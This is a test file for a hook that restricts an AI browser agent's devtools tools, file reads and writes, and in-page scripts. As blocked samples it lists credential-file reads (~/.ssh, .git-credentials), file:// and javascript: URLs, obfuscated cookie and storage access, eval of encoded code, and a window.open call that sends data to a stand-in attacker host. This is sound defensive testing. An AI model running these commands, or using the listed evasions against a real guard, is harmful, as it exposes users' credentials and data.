// browser-guard is the only gate on the browser agent's chrome-devtools tools:
// the agent's `tools` frontmatter does not filter inline MCP server tools. Each
// case below names a way the guard could fail open.
//
// Fail-open modes covered:
//  - a disallowed or unknown chrome tool passes (allowlist drift, prefix tricks)
//  - Read, Write or a tool's filePath escapes <tmp>/claude-browser/ (sibling
//    prefix, `..`, relative or `~` path, symlink, missing path, the dir itself)
//  - evaluate_script reads storage, sends a non-GET request, submits a form, or
//    loads source from disk
//  - navigation reaches a non-web scheme or injects an initScript
//  - a malformed payload (no tool name, garbage stdin) is allowed
//  - the process exits 0 where the decision was a block

import { describe, expect, test } from "bun:test";
import { mkdirSync, realpathSync, symlinkSync } from "node:fs";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  ALLOWED_CHROME_TOOLS,
  type Decision,
  decide,
  findingsDir,
  isInsideFindingsDir,
} from "../src/hooks/browser-guard.ts";
import { parseFrontmatterStrict } from "../src/lib/frontmatter.ts";
import { spawnCapture } from "./support/proc.ts";

const ROOT = resolve(import.meta.dir, "..");
const HOOK = resolve(ROOT, "src", "hooks", "browser-guard.ts");
const HOME = resolve("/fake/home");
const FINDINGS = join(HOME, "claude-browser");
const chrome = (tool: string) => `mcp__chrome-devtools__${tool}`;

function expectBlock(d: Decision): void {
  expect(d.allow).toBe(false);
  if (!d.allow) expect(d.reason.startsWith("[Browser] ")).toBe(true);
}
const allowed = (tool: string, input: unknown) => decide(tool, input, HOME).allow;
const evalAllowed = (fn: string) =>
  allowed(chrome("evaluate_script"), { function: fn, dialogAction: "dismiss" });

describe("chrome tool allowlist", () => {
  const ALLOWED: Record<string, Record<string, unknown>> = {
    navigate_page: { type: "url", url: "https://example.com" },
    take_snapshot: {},
    take_screenshot: {},
    click: { uid: "1_2" },
    fill: { uid: "1_2", value: "search term" },
    type_text: { text: "query" },
    press_key: { key: "Enter" },
    evaluate_script: { function: "() => document.title", dialogAction: "dismiss" },
    list_pages: {},
    new_page: { url: "https://example.com" },
    select_page: { pageId: 1 },
    close_page: { pageId: 1 },
    wait_for: { text: ["Loaded"] },
  };

  test("the set holds exactly the 13 read tools", () => {
    expect([...ALLOWED_CHROME_TOOLS].sort()).toEqual(Object.keys(ALLOWED).sort());
  });

  for (const [tool, input] of Object.entries(ALLOWED)) {
    test(`${tool} with benign input is allowed`, () => {
      expect(decide(chrome(tool), input, HOME)).toEqual({ allow: true });
    });
  }

  // Each one reaches outside reading: uploads, dialogs, styles, console, recording.
  for (const tool of [
    "upload_file",
    "drag",
    "fill_form",
    "hover",
    "handle_dialog",
    "lighthouse_audit",
    "get_css_styles",
    "list_console_messages",
    "screencast_start",
    "x",
    // Set lookup, not an object key or prefix match.
    "constructor",
    "toString",
    "",
    "NAVIGATE_PAGE",
    "navigate_page ",
  ]) {
    test(`${JSON.stringify(tool)} is blocked`, () => {
      expectBlock(decide(chrome(tool), {}, HOME));
    });
  }

  test("matches the chrome tools listed in agents/browser.md", async () => {
    const md = await readFile(join(ROOT, "agents", "browser.md"), "utf8");
    const { data } = parseFrontmatterStrict(md);
    const tools = (data as { tools: string[] }).tools;
    const listed = tools
      .filter((t) => t.startsWith("mcp__chrome-devtools__"))
      .map((t) => t.slice("mcp__chrome-devtools__".length));
    expect(listed.sort()).toEqual([...ALLOWED_CHROME_TOOLS].sort());
  });
});

describe("findings directory", () => {
  test("findingsDir is <tmp>/claude-browser", () => {
    expect(findingsDir(HOME)).toBe(FINDINGS);
  });

  test("isInsideFindingsDir accepts absolute files under it only", () => {
    expect(isInsideFindingsDir(join(FINDINGS, "a.md"), HOME)).toBe(true);
    expect(isInsideFindingsDir(join(FINDINGS, "job", "01.md"), HOME)).toBe(true);
    expect(isInsideFindingsDir("~/claude-browser/a.md", HOME)).toBe(false);
    expect(isInsideFindingsDir("claude-browser/a.md", HOME)).toBe(false);
  });

  test("a symlink inside the dir cannot point a write outside it", async () => {
    const base = realpathSync(await mkdtemp(join(tmpdir(), "cc-browser-guard-")));
    try {
      mkdirSync(findingsDir(base));
      symlinkSync(join(base, "outside"), join(findingsDir(base), "link"));
      mkdirSync(join(base, "outside"));
      expect(isInsideFindingsDir(join(findingsDir(base), "link", "a.md"), base)).toBe(false);
      expect(isInsideFindingsDir(join(findingsDir(base), "real.md"), base)).toBe(true);
    } finally {
      await rm(base, { recursive: true, force: true });
    }
  });

  test("a dangling symlink inside the dir is rejected", async () => {
    const base = realpathSync(await mkdtemp(join(tmpdir(), "cc-browser-guard-")));
    try {
      mkdirSync(findingsDir(base));
      symlinkSync(join(base, "nofile"), join(findingsDir(base), "dangling"));
      expect(isInsideFindingsDir(join(findingsDir(base), "dangling"), base)).toBe(false);
      expect(isInsideFindingsDir(join(findingsDir(base), "dangling", "x.md"), base)).toBe(false);
    } finally {
      await rm(base, { recursive: true, force: true });
    }
  });

  test("isInsideFindingsDir rejects the dir itself, siblings, and escapes", () => {
    expect(isInsideFindingsDir(FINDINGS, HOME)).toBe(false);
    expect(isInsideFindingsDir(`${FINDINGS}/`, HOME)).toBe(false);
    expect(isInsideFindingsDir(join(HOME, "claude-browser-x", "a.md"), HOME)).toBe(false);
    expect(isInsideFindingsDir(`${FINDINGS}/../x`, HOME)).toBe(false);
    expect(isInsideFindingsDir(`${FINDINGS}/a/../../x`, HOME)).toBe(false);
    expect(isInsideFindingsDir("~", HOME)).toBe(false);
  });
});

describe("Write", () => {
  test("allowed inside the findings dir", () => {
    expect(decide("Write", { file_path: join(FINDINGS, "job-01.md") }, HOME)).toEqual({
      allow: true,
    });
  });

  for (const filePath of [
    "/tmp/x",
    join(HOME, "claude-browser-x", "a.md"),
    "~/claude-browser/a.md",
    `${FINDINGS}/../x`,
    "a.md",
    "claude-browser/a.md",
    "",
    FINDINGS,
    join(HOME, ".claude", "settings.json"),
  ]) {
    test(`blocked for ${JSON.stringify(filePath)}`, () => {
      expectBlock(decide("Write", { file_path: filePath }, HOME));
    });
  }

  test("blocked for missing or non-string file_path", () => {
    expectBlock(decide("Write", {}, HOME));
    expectBlock(decide("Write", { file_path: 42 }, HOME));
    expectBlock(decide("Write", { file_path: [join(FINDINGS, "a.md")] }, HOME));
    expectBlock(decide("Write", { path: join(FINDINGS, "a.md") }, HOME));
  });

  test("Read allowed only inside the findings dir", () => {
    expect(allowed("Read", { file_path: join(FINDINGS, "a.md") })).toBe(true);
    for (const file_path of [
      "/etc/hosts",
      "~/.ssh/id_ed25519",
      `${FINDINGS}/../../.git-credentials`,
    ]) {
      expectBlock(decide("Read", { file_path }, HOME));
    }
    expectBlock(decide("Read", {}, HOME));
  });
});

describe("filePath on chrome tools", () => {
  for (const tool of ["take_screenshot", "take_snapshot", "evaluate_script", "click"]) {
    const base =
      tool === "evaluate_script"
        ? { function: "() => document.title", dialogAction: "dismiss" }
        : {};
    test(`${tool}: filePath inside the findings dir allowed`, () => {
      expect(allowed(chrome(tool), { ...base, filePath: join(FINDINGS, "shot.png") })).toBe(true);
    });
    test(`${tool}: filePath outside blocked`, () => {
      for (const filePath of [
        "/tmp/shot.png",
        "shot.png",
        `${FINDINGS}/../shot.png`,
        "~/claude-browser/shot.png",
        "claude-browser/shot.png",
        "",
        null,
      ]) {
        expectBlock(decide(chrome(tool), { ...base, filePath }, HOME));
      }
    });
  }
});

describe("evaluate_script", () => {
  test("plain DOM reads and GET fetches allowed", () => {
    for (const fn of [
      "() => document.title",
      "() => document.querySelector('h1').textContent",
      "() => [...document.querySelectorAll('td')].map((c) => c.innerText)",
      "() => fetch('/api/x').then((r) => r.json())",
      "() => fetch('/api/x', { method: 'GET' })",
      "() => fetch('/api/x', { method: \"GET\" })",
      // Lowercase get is still a GET; the case-insensitive lookahead must not block it.
      "() => fetch('/api/x', { method: 'get' })",
    ]) {
      expect(evalAllowed(fn)).toBe(true);
    }
  });

  test("cookie and storage access blocked", () => {
    for (const fn of [
      "() => document.cookie",
      "() => localStorage.getItem('t')",
      "() => window.localStorage.length",
      "() => sessionStorage.getItem('t')",
      "() => indexedDB.databases()",
      "() => window.indexedDB.open('x')",
      "() => caches.keys()",
      "() => globalThis.caches.keys()",
      "() => self['caches']",
      "() => cookieStore.getAll()",
    ]) {
      expectBlock(decide(chrome("evaluate_script"), { function: fn }, HOME));
    }
  });

  test("non-GET fetch init blocked across quoting and casing", () => {
    for (const fn of [
      "() => fetch('/a', { method: 'POST' })",
      '() => fetch("/a", { method: "PUT" })',
      "() => fetch('/a', { method: `DELETE` })",
      "() => fetch('/a', {method:'post'})",
      "() => fetch('/a', { method : \"Delete\" })",
      "() => fetch('/a', { method: 'PATCH' })",
      "() => new Request('/a', { method: 'POST' })",
      // A verb that merely starts with GET is not GET.
      "() => fetch('/a', { method: 'GETX' })",
    ]) {
      expectBlock(decide(chrome("evaluate_script"), { function: fn }, HOME));
    }
  });

  test("XHR non-GET open, beacons, and form submits blocked", () => {
    for (const fn of [
      "() => { const x = new XMLHttpRequest(); x.open('POST', '/a'); x.send(); }",
      "() => { const x = new XMLHttpRequest(); x.open( \"put\" , '/a'); }",
      "() => navigator.sendBeacon('/a', 'x')",
      "() => document.forms[0].submit()",
      "() => document.forms[0].submit ()",
      "() => document.querySelector('form').requestSubmit()",
    ]) {
      expectBlock(decide(chrome("evaluate_script"), { function: fn }, HOME));
    }
  });

  test("sourcePath blocked even with an inline function", () => {
    expectBlock(
      decide(
        chrome("evaluate_script"),
        { function: "() => document.title", sourcePath: "/tmp/x.js" },
        HOME,
      ),
    );
    expectBlock(decide(chrome("evaluate_script"), { sourcePath: "/tmp/x.js" }, HOME));
  });

  test("missing or non-string function blocked", () => {
    expectBlock(decide(chrome("evaluate_script"), {}, HOME));
    expectBlock(decide(chrome("evaluate_script"), { function: 1 }, HOME));
    expectBlock(decide(chrome("evaluate_script"), { function: null }, HOME));
    expectBlock(decide(chrome("evaluate_script"), { function: ["() => 1"] }, HOME));
  });

  const bypass = (label: string, fns: string[]) =>
    test(label, () => {
      for (const fn of fns) expectBlock(decide(chrome("evaluate_script"), { function: fn }, HOME));
    });
  const read = (label: string, fns: string[]) =>
    test(label, () => {
      for (const fn of fns) {
        expect(
          decide(chrome("evaluate_script"), { function: fn, dialogAction: "dismiss" }, HOME),
        ).toEqual({
          allow: true,
        });
      }
    });
  read("ordinary DOM reads and GET fetches stay allowed", [
    "() => document.querySelector('input[type=submit]')?.value",
    "() => fetch('/api', { method: 'GET', cache: 'no-store' }).then((r) => r.json())",
    '() => fetch("/api", {"method":"GET"})',
    "function () { return document.title; }",
    "() => [...document.querySelectorAll('td')].map((td) => td.textContent)",
  ]);
  // A variable verb cannot be told from 'GET' in source, so XHR is blocked outright; fetch covers reads.
  bypass("XHR is blocked even for GET", [
    "() => { const x = new XMLHttpRequest(); x.open('GET', '/a'); }",
  ]);
  bypass("window.open is blocked", ["() => window.open('https://evil.example/?d=1')"]);
  bypass("quoted method key is blocked", [
    "() => fetch('/a', {'method': 'POST'})",
    '() => fetch("/a", {"method":"POST"})',
  ]);
  bypass("method from a variable or shorthand is blocked", [
    "() => { const method = 'POST'; return fetch('/a', { method }); }",
    "() => fetch('/a', { method: m })",
  ]);
  bypass("XHR open with a variable verb is blocked", [
    "() => { const x = new XMLHttpRequest(); x.open(verb, '/a'); }",
  ]);
  bypass("bracket or concatenated storage access is blocked", [
    "() => window['local' + 'Storage'].getItem('t')",
    "() => document['cookie']",
    "() => document['coo' + 'kie']",
  ]);
  bypass("indirect form submit is blocked", [
    "() => document.forms[0]['submit']()",
    "() => HTMLFormElement.prototype.submit.call(document.forms[0])",
  ]);
  bypass("WebSocket send and dynamic code evaluation are blocked", [
    "() => new WebSocket('wss://x').send('y')",
    "() => eval(atob('Zm9v'))",
    "() => new Function('return 1')()",
  ]);
});

describe("navigate_page and new_page", () => {
  for (const tool of ["navigate_page", "new_page"]) {
    test(`${tool}: http and https allowed`, () => {
      for (const url of ["https://example.com", "http://localhost:3000", "HTTPS://EXAMPLE.COM"]) {
        expect(allowed(chrome(tool), { url })).toBe(true);
      }
    });

    test(`${tool}: non-web schemes blocked`, () => {
      for (const url of [
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<p>x</p>",
        "chrome://settings",
        "chrome-extension://abc/index.html",
        "view-source:https://example.com",
        "blob:https://example.com/uuid",
        "about:blank",
        "ftp://example.com",
        "not a url",
        "",
      ]) {
        expectBlock(decide(chrome(tool), { url }, HOME));
      }
    });

    test(`${tool}: non-string url blocked`, () => {
      expectBlock(decide(chrome(tool), { url: 1 }, HOME));
      expectBlock(decide(chrome(tool), { url: null }, HOME));
      expectBlock(decide(chrome(tool), { url: { href: "https://example.com" } }, HOME));
    });

    test(`${tool}: initScript blocked, whatever its value`, () => {
      for (const initScript of ["() => {}", "", null]) {
        expectBlock(decide(chrome(tool), { url: "https://example.com", initScript }, HOME));
      }
    });
  }

  test("navigate_page reload and back without a url allowed", () => {
    expect(allowed(chrome("navigate_page"), { type: "reload" })).toBe(true);
    expect(allowed(chrome("navigate_page"), { type: "back" })).toBe(true);
    expect(allowed(chrome("navigate_page"), { type: "forward" })).toBe(true);
  });
});

describe("malformed payloads", () => {
  for (const toolName of [undefined, null, 123, "", {}, ["Write"]]) {
    test(`tool_name ${JSON.stringify(toolName)} blocked`, () => {
      expectBlock(decide(toolName, { file_path: join(FINDINGS, "a.md") }, HOME));
    });
  }

  // A non-object tool_input is checked as `{}`: tools that need a field block,
  // tools with nothing to check stay allowed.
  for (const input of [null, undefined, "x", 1, [join(FINDINGS, "a.md")]]) {
    test(`tool_input ${JSON.stringify(input)}: Write and evaluate_script blocked`, () => {
      expectBlock(decide("Write", input, HOME));
      expectBlock(decide(chrome("evaluate_script"), input, HOME));
      expectBlock(decide(chrome("upload_file"), input, HOME));
    });
  }
});

describe("as a process", () => {
  async function run(stdin: string) {
    const home = await mkdtemp(join(tmpdir(), "cc-browser-guard-"));
    try {
      const r = await spawnCapture(["bun", HOOK], {
        env: { HOME: home, USERPROFILE: home },
        stdin,
      });
      return { ...r, home };
    } finally {
      await rm(home, { recursive: true, force: true });
    }
  }

  test("blocked call exits 2 with a block envelope", async () => {
    const r = await run(
      JSON.stringify({ tool_name: chrome("upload_file"), tool_input: { filePaths: ["/etc/x"] } }),
    );
    expect(r.exit).toBe(2);
    const out = JSON.parse(r.stdout) as { decision: string; reason: string };
    expect(out.decision).toBe("block");
    expect(out.reason.startsWith("[Browser] ")).toBe(true);
  });

  test("Write outside the findings dir exits 2", async () => {
    const r = await run(
      JSON.stringify({ tool_name: "Write", tool_input: { file_path: "/tmp/x" } }),
    );
    expect(r.exit).toBe(2);
  });

  test("allowed call exits 0 silently, resolving the temp dir from the environment", async () => {
    const home = realpathSync(await mkdtemp(join(tmpdir(), "cc-browser-guard-")));
    try {
      const r = await spawnCapture(["bun", HOOK], {
        env: { HOME: home, USERPROFILE: home, TMPDIR: home, TEMP: home, TMP: home },
        stdin: JSON.stringify({
          tool_name: "Write",
          tool_input: { file_path: join(home, "claude-browser", "a.md") },
        }),
      });
      expect(r.exit).toBe(0);
      expect(r.stdout).toBe("");
    } finally {
      await rm(home, { recursive: true, force: true });
    }
  });

  test("garbage stdin exits 2", async () => {
    expect((await run("not json {")).exit).toBe(2);
  });

  test("empty stdin exits 2", async () => {
    expect((await run("")).exit).toBe(2);
  });

  test("JSON that is not an object exits 2", async () => {
    expect((await run("null")).exit).toBe(2);
    expect((await run('["Write"]')).exit).toBe(2);
  });
});

describe("evaluate_script dialogs and scripted actions", () => {
  test("dialogAction must be dismiss", () => {
    for (const dialogAction of [undefined, "accept", "Dismiss", 1]) {
      expectBlock(
        decide(chrome("evaluate_script"), { function: "() => document.title", dialogAction }, HOME),
      );
    }
  });

  test("scripted clicks, synthetic events and string escapes blocked", () => {
    for (const fn of [
      "() => document.querySelector('[data-action=delete]').click()",
      "() => el.dispatchEvent(new MouseEvent('click'))",
      "() => document['\\u0063ookie']",
      "() => window['\\x6cocalStorage']",
    ]) {
      expect(evalAllowed(fn)).toBe(false);
    }
  });
});
